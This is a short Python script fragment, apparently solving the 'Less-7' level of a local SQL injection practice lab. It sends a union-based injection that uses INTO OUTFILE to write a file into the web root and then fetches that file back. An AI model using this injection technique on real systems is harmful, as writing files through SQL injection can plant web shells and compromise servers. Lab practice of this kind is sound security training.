...
url = "http://127.0.0.1/sqli/Less-7/"
...
def load(url):
    ...
    #             print length
    #             break
    response = requests.get(url+"?id=-1')) union select 1,2,3 into outfile 'F:/php/htdocs/sqli/Less-7/123.txt' %23",headers=header)
    print response.content
    r = requests.get(url+"123.txt",headers=header)
    print r.content
